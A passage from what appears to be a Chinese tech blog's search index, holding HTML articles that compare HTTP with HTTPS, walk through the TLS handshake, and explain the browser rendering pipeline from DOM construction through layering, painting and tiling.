的基础之上增加了一系列的安全机制。一方面可以保证数据传输的安全，另一方面对访问者增加了验证机制。是目前现行架构下，最为安全的解决方案。</p>\n<h2 id=\"主要区别\"><a href=\"#主要区别\" class=\"headerlink\" title=\"主要区别\"></a>主要区别</h2><ol>\n<li><p>安全性</p>\n<ul>\n<li>HTTP 是明文传输协议，数据在传输过程中不加密，容易被篡改和窃听；</li>\n<li>HTTPS 通过使用 SSL (Secure Sockets Layer) 和 TLS (Transport Layer Security) 协议对数据进行加密，确保数据在传输过程中的安全性，防止被窃听和篡改；</li>\n</ul>\n</li>\n<li><p>数据传输协议</p>\n<ul>\n<li>HTTP 使用 TCP (Transmission Control Protocol) 作为传输协议，数据传输速度快；</li>\n<li>HTTPS 在 HTTP 的基础之上加入了 SSL/TLS 协议，需要进行加解密操作，数据传输速度慢；</li>\n</ul>\n</li>\n<li><p>端口号</p>\n<ul>\n<li>HTTP 默认端口号 80；</li>\n<li>HTTPS 默认端口号 443；</li>\n</ul>\n</li>\n<li><p>证书</p>\n<ul>\n<li>HTTPS 需要使用 SSL 证书，用于验证服务器的身份，并确保数据传输的安全；</li>\n<li>HTTP 不需要使用证书。</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"HTTP-执行机制\"><a href=\"#HTTP-执行机制\" class=\"headerlink\" title=\"HTTP 执行机制\"></a>HTTP 执行机制</h2><ol>\n<li><p>客户端发起请求:</p>\n<p> 客户端向服务器发送 HTTP 请求。这个请求可以是不同类型的，如 GET（请求数据），POST（提交数据），PUT（更新数据）等；</p>\n</li>\n<li><p>建立连接:</p>\n<p> 客户端通过网络与服务器建立 TCP 连接，通常是到服务器的 80 端口。<br> 对于现代浏览器和服务器，通常使用更复杂的 TCP 握手过程，比如 TCP 快速打开（TFO）和 TLS 假开始（TLS False Start）。</p>\n</li>\n<li><p>发送请求:</p>\n<p> 一旦 TCP 连接建立，客户端发送一个 HTTP 请求。HTTP 请求包括一个请求行（指明动作如 GET 或 POST）、请求头（包含元数据如 User-Agent、Accept、Content-Type 等）和请求体（对于 POST 请求，包含要提交的数据）。</p>\n</li>\n<li><p>服务器处理请求:</p>\n<p> 服务器接收请求并根据请求类型处理它。服务器可能会查询数据库、读取文件或执行其他操作来生成响应。</p>\n</li>\n<li><p>服务器响应:</p>\n<p> 服务器发送一个 HTTP 响应到客户端。响应包括一个状态行（包含状态码如 200 OK 或 404 Not Found）、响应头（包含元数据如 Content-Type、Cache-Control 等）和响应体（包含请求的资源的实际数据）。</p>\n</li>\n<li><p>关闭连接:</p>\n<ul>\n<li>在 HTTP/1.0 中，完成响应后，服务器关闭 TCP 连接；</li>\n<li>在 HTTP/1.1 中，默认使用持久连接（keep-alive），连接在多个请求和响应之后保持打开状态，除非客户端或服务器决定关闭它；</li>\n<li>在 HTTP/2 中，多个请求可以在同一个连接上并行无阻塞地进行，进一步提高效率。</li>\n</ul>\n</li>\n<li><p>客户端处理响应:</p>\n<p> 客户端接收响应并根据内容类型处理数据，如渲染 HTML 页面、解析 JSON 数据等。</p>\n</li>\n</ol>\n<h2 id=\"HTTPS-执行机制\"><a href=\"#HTTPS-执行机制\" class=\"headerlink\" title=\"HTTPS 执行机制\"></a>HTTPS 执行机制</h2><ol>\n<li><p>客户端请求:</p>\n<p> 客户端通过在请求的 URL 中使用 “https://” 来发起一个 HTTPS 连接。</p>\n</li>\n<li><p>TLS 握手</p>\n<p> 服务器在其端口 443 上监听 HTTPS 请求，并在收到请求时响应；<br> 服务器将其 TLS 证书发送给客户端。这个证书包含了服务器的公钥和证书颁发机构（CA）的签名；</p>\n</li>\n<li><p>证书验证:</p>\n<p> 客户端验证服务器的证书是否有效，是否在有效期内，以及是否由受信任的 CA 签发。这个过程也包括检查证书的撤销状态。<br> 这一步，将执行以下步骤进行身份验证：</p>\n<ul>\n<li>验证证书链：客户端检查服务器证书是否由受信任的证书颁发机构（CA）签发，以及证书链是否有效；</li>\n<li>检查有效期：客户端检查证书的有效期，确保证书当前有效期未过期；</li>\n<li>检查撤销状态：客户端肯呢个会检查证书是否被撤销，这可以通过访问 CA 的在线证书状态协议 (OCSP) 服务器或者下载证书撤销列表 (CRL) 来完成；</li>\n<li>验证数字签名：客户端使用 CA 的公钥来解密证书的数字签名，以确保它是由正确的 CA 签发且未被篡改；</li>\n</ul>\n</li>\n<li><p>密钥交换</p>\n<p> 一旦确认证书有效，客户端使用服务器的公钥来加密生成一个随机的会话密钥，并将其发送给服务器；<br> 服务器用其私钥解密这个会话密钥。现在，客户端和服务器端都有了共同的会话密钥，用于后续通信的加密；</p>\n</li>\n<li><p>加密通信</p>\n<p> 使用会话密钥，客户端和服务器端之间的所有数据传输都将被加密。这保证了数据传输的机密性和完整性；<br> 客户端和服务器会使用对称加密算法来加密进一步的通信；</p>\n</li>\n<li><p>数据交换</p>\n<p> 客户端和服务器现在可以完全的交换 HTTP 数据。客户端发送加密的 HTTP 请求，服务器以加密的 HTTP 响应回复；</p>\n</li>\n<li><p>会话结束</p>\n<p> 一旦会话完成，客户端和服务器将结束连接并丢弃会话密钥，确保每一个连接都使用一个新的随机密钥。</p>\n</li>\n</ol>\n","categories":["浏览器","protocol"],"tags":["前端","浏览器","http","https"]},{"title":"浏览器渲染流程","url":"//browser/protocol/http/render.html","content":"<p>在<a href=\"/browser/protocol/http-navigation.html\">上一篇文章</a>中我们介绍了导航相关的流程，那导航被提交后又会怎么样呢？就进入了渲染阶段。这个阶段很重要，了解其相关流程能让你 “看透” 页面是如何工作的，有了这些知识，你可以解决一系列相关的问题，比如能熟练使用开发者工具，因为能够理解开发者工具里面大部分项目的含义，能优化页面卡顿问题，使用 JavaScript 优化动画流程，通过优化样式表来防止强制同步布局等等。</p>\n<p>通常，我们编写好 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出漂亮的页面（如下图所示），但是你知道它们是如何转化成页面的吗？这背后的原理，估计很多人都答不上来。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e19540ea9cb1403fbcf01.png\" alt=\"渲染流程示意图\"></p>\n<p>从图中可以看出，左边输入的是 HTML、CSS、JavaScript 数据，这些数据经过中间渲染模块的处理，最终输出为屏幕上的像素。</p>\n<p>这中间的<strong>渲染模块</strong>就是我们今天要讨论的主题。为了能更好地理解下文，你可以先结合下图快速抓住 HTML、CSS 和 JavaScript 的含义：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e19680ea9cb1403fbf33d.png\" alt=\"HTML、CSS和JavaScript关系图\"></p>\n<p>从上图可以看出，HTML 的内容是由标记和文本组成。标记也称为标签，每个标签都有它自己的语义，浏览器会根据标签的语义来正确展示 HTML 内容。比如上面的 <code>&lt;p&gt;</code> 标签是告诉浏览器在这里的内容需要创建一个新段落，中间的文本就是段落中需要显示的内容。</p>\n<p>如果需要改变 HTML 的字体颜色、大小等信息，就需要用到 CSS。CSS 又称为<strong>层叠样式表，是由选择器和属性组成</strong>，比如图中的 p 选择器，它会把 HTML 里面 <code>&lt;p&gt;</code> 标签的内容选择出来，然后再把选择器的属性值应用到 <code>&lt;p&gt;</code> 标签内容上。选择器里面有个 color 属性，它的值是 red，这是告诉渲染引擎把 <code>&lt;p&gt;</code> 标签的内容显示为红色。</p>\n<p>至于 <strong>JavaScript（简称为 JS），使用它可以使网页的内容 “动” 起来</strong>，比如上图中，可以通过 JavaScript 来修改 CSS 样式值，从而达到修改文本颜色的目的。</p>\n<p>搞清楚 HTML、CSS 和 JavaScript 的含义后，那么接下来我们就正式开始分析渲染模块了。</p>\n<p>由于渲染机制过于复杂，所以渲染模块在执行过程中会被划分为很多子阶段，输入的 HTML 经过这些子阶段，最后输出像素。我们把这样的一个处理流程叫做渲染流水线，其大致流程如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e26820ea9cb1403168ad3.png\" alt=\"渲染流水线示意图\"></p>\n<p>按照渲染的时间顺序，流水线可以分为如下几个子阶段：构建 DOM 数、计算样式、布局节点、分层、绘制、分块、光栅化和合成。接下来，在介绍每一段的过程中，你应该注意关注以下三点内容：</p>\n<ul>\n<li>开始每个子阶段都有输入内容；</li>\n<li>然后每个子阶段有其他处理过程；</li>\n<li>最终每个子阶段会生成输出内容。<br>理解了这三部分内容，能让你更加清晰地理解每个子阶段。</li>\n</ul>\n<h2 id=\"构建-DOM-树\"><a href=\"#构建-DOM-树\" class=\"headerlink\" title=\"构建 DOM 树\"></a>构建 DOM 树</h2><p>为什么要构建 DOM 树呢？这是因为浏览器无法直接理解和使用 HTML，所以需要将 HTML 转换为浏览器能够理解的结构 ——DOM 树。</p>\n<p>这里我们还需要简单介绍下什么是树结构，为了更直观地理解，你可以参考下面我画的几个树结构：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e269f0ea9cb140316b3e5.png\" alt=\"树结构示意图\"></p>\n<p>从图中可以看出，树这种结构非常像我们现实生活中的 “树”，其中每个点我们称为节点，相连的节点称为父子节点。树结构在浏览器中的应用还是比较多的，比如下面我们要介绍的渲染流程，就在频繁地使用树结构。</p>\n<p>接下来咱们还是言归正传，来看看 DOM 树的构建过程，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e275a0ea9cb140317df8e.png\" alt=\"DOM树构建过程示意图\"></p>\n<p>从图中可以看出，构建 DOM 树的输入内容是一个非常简单的 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM。</p>\n<p>为了更加直观地理解 DOM 树，你可以打开 Chrome 的 “开发者工具”，选择 “Console” 标签来打开控制台，然后在控制台里面输入 “document” 后回车，这样你就能看到一个完整的 DOM 树结构，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e278f0ea9cb14031835ea.png\" alt=\"DOM可视化\"></p>\n<p>图中的 document 就是 DOM 结构，你可以看到，DOM 和 HTML 内容几乎是一样的，但是和 HTML 不同的是，DOM 是保存在内存中树状结构，可以通过 JavaScript 来查询或修改其内容。</p>\n<p>那下面就来看看如何通过 JavaScript 来修改 DOM 的内容，在控制台中输入：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">\"p\"</span>)[<span class=\"number\">0</span>].<span class=\"property\">innerText</span> = <span class=\"string\">\"black\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>这行代码的作用是把第一个 <code>&lt;p&gt;</code> 标签的内容修改为 black，具体执行结果你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e27e70ea9cb140318cb4e.png\" alt=\"通过JavaScript修改DOM\"></p>\n<p>从图中可以看出，在执行了一段修改第一个 <code>&lt;p&gt;</code> 标签的 JavaScript 代码后，DOM 的第一个 p 节点的内容成功被修改，同时页面中的内容也被修改了。</p>\n<p>好了，现在我们已经生成 DOM 树了，但是 DOM 节点的样式我们依然不知道，要让 DOM 节点拥有正确的样式，这就需要样式计算了。</p>\n<h2 id=\"样式计算（Recalculate-Style）\"><a href=\"#样式计算（Recalculate-Style）\" class=\"headerlink\" title=\"样式计算（Recalculate Style）\"></a>样式计算（Recalculate Style）</h2><p>样式计算的目的是为了计算出 DOM 节点中每个元素的具体样式，这个阶段大体可分为三步来完成。</p>\n<h3 id=\"1-把CSS转换为浏览器能够理解的结构\"><a href=\"#1-把CSS转换为浏览器能够理解的结构\" class=\"headerlink\" title=\"1. 把CSS转换为浏览器能够理解的结构\"></a>1. 把 CSS 转换为浏览器能够理解的结构</h3><p>那 CSS 样式的来源主要有哪些呢？你可以先参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e28840ea9cb140319c468.png\" alt=\"HTML加载CSS的三种方式\"></p>\n<p>从图中可以看出，CSS 样式来源主要有三种：</p>\n<ul>\n<li>通过 link 引用的外部 CSS 文件；</li>\n<li><code>&lt;style&gt;</code> 标记内的 CSS；</li>\n<li>元素的 style 属性内嵌的 CSS<br>和 HTML 文件一样，浏览器也是无法直接理解这些纯文本的 CSS 样式，所以<strong>当渲染引擎接收到 CSS 文本时，会执行一个转换操作，将 CSS 文本转换为浏览器可以理解的结构 ——styleSheets</strong>。</li>\n</ul>\n<p>为了加深理解，你可以在 Chrome 控制台中查看其结构，只需要在控制台中输入 <code>document.styleSheets</code>，然后就看到如下图所示的结构：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e289f0ea9cb140319f7af.png\" alt=\"styleSheets\"></p>\n<p>从图中可以看出，这个样式表包含了很多种样式，已经把那三种来源的样式都包含进去了。当然样式表的具体结构不是我们今天讨论的重点，你只需要知道渲染引擎会把获取到的 CSS 文本全部转换为 styleSheets 结构中的数据，并且该结构同时具备了查询和修改功能，这会为后面的样式操作提供基础。</p>\n<h3 id=\"2-转换样式表中的属性值，使其标准化\"><a href=\"#2-转换样式表中的属性值，使其标准化\" class=\"headerlink\" title=\"2. 转换样式表中的属性值，使其标准化\"></a>2. 转换样式表中的属性值，使其标准化</h3><p>现在我们已经把现有的 CSS 文本转化为浏览器可以理解的结构了，那么<strong>接下来就要对其进行属性值的标准化操作</strong>。</p>\n<p>要理解什么是属性值标准化，你可以看下面这样一段 CSS 文本：</p>\n<figure class=\"highlight css\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {   <span class=\"attribute\">font-size</span>: <span class=\"number\">2em</span>        }</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> {      <span class=\"attribute\">color</span>: blue;          }</span><br><span class=\"line\"><span class=\"selector-tag\">span</span>  {  <span class=\"attribute\">display</span>: none         }</span><br><span class=\"line\"><span class=\"selector-tag\">div</span> {    <span class=\"attribute\">font-weight</span>: bold     }</span><br><span class=\"line\"><span class=\"selector-tag\">div</span>  <span class=\"selector-tag\">p</span> { <span class=\"attribute\">color</span>: green;         }</span><br><span class=\"line\"><span class=\"selector-tag\">div</span> {    <span class=\"attribute\">color</span>: red;           }</span><br></pre></td></tr></tbody></table></figure>\n\n<p>可以看到上面的 CSS 文本中有很多属性值，如 <code>2em</code>、<code>blue</code>、<code>bold</code>，这些类型数值不容易被渲染引擎理解，所以需要将所有值转换为渲染引擎容易理解的、标准化的计算值，这个过程就是属性值标准化。</p>\n<p>那标准化后的属性值是什么样子的？</p>\n<figure class=\"highlight css\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {   <span class=\"attribute\">font-size</span>: <span class=\"number\">36px</span>       }</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> {      <span class=\"attribute\">color</span>: <span class=\"built_in\">rgb</span>(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">255</span>) }</span><br><span class=\"line\"><span class=\"selector-tag\">span</span>  {  <span class=\"attribute\">display</span>: none         }</span><br><span class=\"line\"><span class=\"selector-tag\">div</span> {    <span class=\"attribute\">font-weight</span>: <span class=\"number\">700</span>      }</span><br><span class=\"line\"><span class=\"selector-tag\">div</span>  <span class=\"selector-tag\">p</span> { <span class=\"attribute\">color</span>: <span class=\"built_in\">rgb</span>(<span class=\"number\">0</span>, <span class=\"number\">128</span>, <span class=\"number\">0</span>) }</span><br><span class=\"line\"><span class=\"selector-tag\">div</span> {    <span class=\"attribute\">color</span>: <span class=\"built_in\">rgb</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) }</span><br></pre></td></tr></tbody></table></figure>\n\n<p>可以看到，2em 被解析成了 32px，red 被解析成了 rgb (255,0,0)，bold 被解析成了 700……</p>\n<h3 id=\"3-计算出DOM树中每个节点的具体样式\"><a href=\"#3-计算出DOM树中每个节点的具体样式\" class=\"headerlink\" title=\"3. 计算出DOM树中每个节点的具体样式\"></a>3. 计算出 DOM 树中每个节点的具体样式</h3><p>现在样式的属性已被标准化了，接下来就需要计算 DOM 树中每个节点的样式属性了，如何计算呢？</p>\n<p>这就涉及到 CSS 的继承规则和层叠规则了。</p>\n<p>首先是 CSS 继承。CSS 继承就是每个 DOM 节点都包含有父节点的样式。这么说可能有点抽象，我们可以结合具体例子，看下面这样一张样式表是如何应用到 DOM 节点上的。</p>\n<figure class=\"highlight css\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {  <span class=\"attribute\">font-size</span>: <span class=\"number\">20px</span>             }</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> {     <span class=\"attribute\">color</span>: blue;                }</span><br><span class=\"line\"><span class=\"selector-tag\">span</span>  { <span class=\"attribute\">display</span>: none               }</span><br><span class=\"line\"><span class=\"selector-tag\">div</span> {   <span class=\"attribute\">font-weight</span>: bold;<span class=\"attribute\">color</span>:red }</span><br><span class=\"line\"><span class=\"selector-tag\">div</span> <span class=\"selector-tag\">p</span> { <span class=\"attribute\">color</span>: green;               }</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这张样式表最终应用到 DOM 节点的效果如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e2c530ea9cb14031eba5c.png\" alt=\"计算后DOM的样式\"></p>\n<p>从图中可以看出，所有子节点都继承了父节点样式。比如 body 节点的 font-size 属性是 20，那 body 节点下面的所有节点的 font-size 都等于 20。</p>\n<p>为了加深你对 CSS 继承的理解，你可以打开 Chrome 的 “开发者工具”，选择第一个 “element” 标签，再选择 “style” 子标签，你会看到如下界面：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e2c820ea9cb14031edcbd.png\" alt=\"样式的继承过程界面\"></p>\n<p>这个界面展示的信息很丰富，大致可描述为如下。</p>\n<ul>\n<li>首先，可以选择要查看的<strong>元素的样式（位于图中的区域 2 中）</strong>，在图中的第 1 个区域中点击对应的元素，就可以在下面的区域查看该元素的样式了。比如这里我们选择的元素是 <code>&lt;p&gt;</code> 标签，位于 <code>html.body.div.</code> 这个路径下面。</li>\n<li>其次，可以从<strong>样式来源（位于图中的区域 3 中）</strong>中查看样式的具体来源信息，看看是来源于样式文件，还是来源于 UserAgent 样式表。<strong>这里需要特别提下 UserAgent 样式，它是浏览器提供的一组默认样式，如果你不提供任何样式，默认使用的就是 UserAgent 样式</strong>。</li>\n<li>最后，可以通过区域 2 和区域 3 来查看样式继承的具体过程。<br>以上就是 CSS 继承的一些特性，样式计算过程中，会根据 DOM 节点的继承关系来合理计算节点样式。</li>\n</ul>\n<p>样式计算过程中的第二个规则是样式层叠。<strong>层叠是 CSS 的一个基本特征，它是一个定义了如何合并来自多个源的属性值的算法。它在 CSS 处于核心地位，CSS 的全称 “层叠样式表” 正是强调了这一点</strong>。关于层叠的具体规则这里就不做过多介绍了，网上资料也非常多，你可以自行搜索学习。</p>\n<p>总之，样式计算阶段的目的是为了计算出 DOM 节点中每个元素的具体样式，在计算过程中需要遵守 CSS 的继承和层叠两个规则。这个阶段最终输出的内容是每个 DOM 节点的样式，并被保存在 ComputedStyle 的结构内。</p>\n<p>如果你想了解每个 DOM 元素最终的计算样式，可以打开 Chrome 的 “开发者工具”，选择第一个 “element” 标签，然后再选择 “Computed” 子标签，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e2cb90ea9cb14031f29e4.png\" alt=\"DOM元素最终计算的样式\"></p>\n<p>上图红色方框中显示了 <code>html.body.div.p</code> 标签的 ComputedStyle 的值。你想要查看哪个元素，点击左边对应的标签就可以了。</p>\n<h2 id=\"布局阶段\"><a href=\"#布局阶段\" class=\"headerlink\" title=\"布局阶段\"></a>布局阶段</h2><p>现在，我们有 DOM 树和 DOM 树中元素的样式，但这还不足以显示页面，因为我们还不知道 DOM 元素的几何位置信息。<strong>那么接下来就需要计算出 DOM 树中可见元素的几何位置，我们把这个计算过程叫做布局</strong>。</p>\n<p>Chrome 在布局阶段需要完成两个任务：创建布局树和布局计算。</p>\n<h3 id=\"1-创建布局树\"><a href=\"#1-创建布局树\" class=\"headerlink\" title=\"1. 创建布局树\"></a>1. 创建布局树</h3><p>你可能注意到了 DOM 树还含有很多不可见的元素，比如 head 标签，还有使用了 <code>display:none</code> 属性的元素。所以在<strong>显示之前，我们还要额外地构建一棵只包含可见元素布局树</strong>。</p>\n<p>我们结合下图来看看布局树的构造过程：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e2f090ea9cb1403231904.png\" alt=\"布局树构造过程示意图\"></p>\n<p>从上图可以看出，DOM 树中所有不可见的节点都没有包含到布局树中。</p>\n<p>为了构建布局树，浏览器大体上完成了下面这些工作：</p>\n<ul>\n<li>遍历 DOM 树中的所有可见节点，并把这些节点加到布局树中；</li>\n<li>而不可见的节点会被布局树忽略掉，如 head 标签下面的全部内容，再比如 <code>body.p.span</code> 这个元素，因为它的属性包含 <code>dispaly:none</code>，所以这个元素也没有被包进布局树。</li>\n</ul>\n<h3 id=\"2-布局计算\"><a href=\"#2-布局计算\" class=\"headerlink\" title=\"2. 布局计算\"></a>2. 布局计算</h3><p>现在我们有了一棵完整的布局树。那么接下来，就要计算布局树节点的坐标位置了。布局的计算过程非常复杂，我们这里先跳过不讲，等到后面章节中我再做详细的介绍。</p>\n<p>在执行布局操作的时候，会把布局运算的结果重新写回布局树中，所以布局树既是输入内容也是输出内容，这是布局阶段一个不合理的地方，因为在布局阶段并没有清晰地将输入内容和输出内容区分开来。针对这个问题，Chrome 团队正在重构布局代码，下一代布局系统叫 LayoutNG，试图更清晰地分离输入和输出，从而让新设计的布局算法更加简单。</p>\n<h2 id=\"分层\"><a href=\"#分层\" class=\"headerlink\" title=\"分层\"></a>分层</h2><p>现在我们有了布局树，而且每个元素的具体位置信息都计算出来了，那么接下来是不是就要开始着手绘制页面了？</p>\n<p>答案依然是否定的。</p>\n<p>因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，为了更加方便地实现这些效果，<strong>渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树</strong>（LayerTree）。如果你熟悉 PS，相信你会很容易理解图层的概念，正是这些图层叠加在一起构成了最终的页面图像。</p>\n<p>要想直观地理解什么是图层，你可以打开 Chrome 的 “开发者工具”，选择 “Layers” 标签，就可以可视化页面的分层情况，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3b160ea9cb1403381d0c.png\" alt=\"渲染引擎给页面多图层示意图\"></p>\n<p>从上图可以看出，渲染引擎给页面分了很多图层，这些图层按照一定顺序叠加在一起，就形成了最终的页面，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3b7a0ea9cb140338effe.png\" alt=\"图层叠加的最终展示页面\"></p>\n<p>现在你知道了<strong>浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面</strong>。下面我们再来看看这些图层和布局树节点之间的关系，如文中图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3bdf0ea9cb140339b58c.png\" alt=\"布局树和图层树关系示意图\"></p>\n<p>通常情况下，<strong>并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层</strong>。如上图中的 span 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。</p>\n<p>那么需要满足什么条件，渲染引擎才会为特定的节点创建新的图层呢？通常满足下面两点中任意一点的元素就可以被提升为单独的一个图层。</p>\n<p><strong>第一点，拥有层叠上下文属性的元素会被提升为单独的一层</strong>。</p>\n<p>页面是个二维平面，但是层叠上下文能够让 HTML 元素具有三维概念，这些 HTML 元素按照自身属性的优先级分布在垂直于这个二维平面的 z 轴上。你可以结合下图来直观感受下：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3c340ea9cb14033a6f64.png\" alt=\"层叠上下文示意图\"></p>\n<p>从图中可以看出，明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素等，都拥有层叠上下文属性。</p>\n<p><strong>第二点，需要剪裁（clip）的地方也会被创建为图层</strong>。</p>\n<p>不过首先你需要了解什么是剪裁，结合下面的 HTML 代码：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">      <span class=\"selector-tag\">div</span> {</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">width</span>: <span class=\"number\">200</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">height</span>: <span class=\"number\">200</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">overflow</span>:auto;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">background</span>: gray;</span></span><br><span class=\"line\"><span class=\"language-css\">        } </span></span><br><span class=\"line\"><span class=\"language-css\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>所以元素有了层叠上下文的属性或者需要被剪裁，那么就会被提升成为单独一层，你可以参看下图：<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>从上图我们可以看到，document层上有A和B层，而B层之上又有两个图层。这些图层组织在一起也是一颗树状结构。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>图层树是基于布局树来创建的，为了找出哪些元素需要在哪些层中，渲染引擎会遍历布局树来创建层树（Update LayerTree）。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span> </span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>在这里我们把 div 的大小限定为 <code>200 * 200</code> 像素，而 div 里面的文字内容比较多，文字所显示的区域肯定会超出 <code>200 * 200</code> 的面积，这时候就产生了剪裁，渲染引擎会把裁剪文字内容的一部分用于显示在 div 区域，下图是运行时的执行结果：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3e1d0ea9cb14033e8787.png\" alt=\"剪裁执行结果\"></p>\n<p>出现这种裁剪情况的时候，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层。你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3e350ea9cb14033eb626.png\" alt=\"被裁剪的内容会出现在单独一层\"></p>\n<p>所以说，元素有了层叠上下文的属性或者需要被剪裁，满足其中任意一点，就会被提升成为单独一层。</p>\n<h2 id=\"图层绘制\"><a href=\"#图层绘制\" class=\"headerlink\" title=\"图层绘制\"></a>图层绘制</h2><p>在完成图层树的构建之后，渲染引擎会对图层树中的每个图层进行绘制，那么接下来我们看看渲染引擎是怎么实现图层绘制的？</p>\n<p>试想一下，如果给你一张纸，让你先把纸的背景涂成蓝色，然后在中间位置画一个红色的圆，最后再在圆上画个绿色三角形。你会怎么操作呢？</p>\n<p>通常，你会把你的绘制操作分解为三步：</p>\n<ol>\n<li>绘制蓝色背景；</li>\n<li>在中间绘制一个红色的圆；</li>\n<li>再在圆上绘制绿色三角形。<br>渲染引擎实现图层的绘制与之类似，会把一个图层的绘制拆分成很多小的绘制指令，然后再把这些指令按照顺序组成一个待绘制列表，如下图所示：</li>\n</ol>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3ebc0ea9cb14033fe7b4.png\" alt=\"绘制列表\"></p>\n<p>从图中可以看出，绘制列表中的指令其实非常简单，就是让其执行一个简单的绘制操作，比如绘制粉色矩形或者黑色的线等。而绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。所以在图层绘制阶段，输出的内容就是这些待绘制列表。</p>\n<p>你也可以打开 “开发者工具” 的 “Layers” 标签，选择 “document” 层，来实际体验下绘制列表，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3f250ea9cb14034112d7.png\" alt=\"一个图层的绘制列表\"></p>\n<p>在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。</p>\n<h2 id=\"栅格化（raster）操作\"><a href=\"#栅格化（raster）操作\" class=\"headerlink\" title=\"栅格化（raster）操作\"></a>栅格化（raster）操作</h2><p>绘制列表只是用来记录绘制顺序和绘制指令的列表，而实际上绘制操作是由渲染引擎中的合成线程来完成的。你可以结合下图来看下渲染主线程和合成线程之间的关系：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e3fbc0ea9cb140342453f.png\" alt=\"渲染进程中的合成线程和主线程\"></p>\n<p>如上图所示，当图层的绘制列表准备好之后，主线程会把该绘制列表提交（commit）给合成线程，那么接下来合成线程是怎么工作的呢？</p>\n<p>那我们得先来看看什么是视口，你可以参看下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e403d0ea9cb1403435f72.png\" alt=\"视口\"></p>\n<p>通常一个页面可能很大，但是用户只能看到其中的一部分，我们把用户可以看到的这个部分叫做<strong>视口</strong>（viewport）。</p>\n<p>在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。</p>\n<p>基于这个原因，<strong>合成线程会将图层划分为图块</strong>（tile），这些图块的大小通常是 256x256 或者 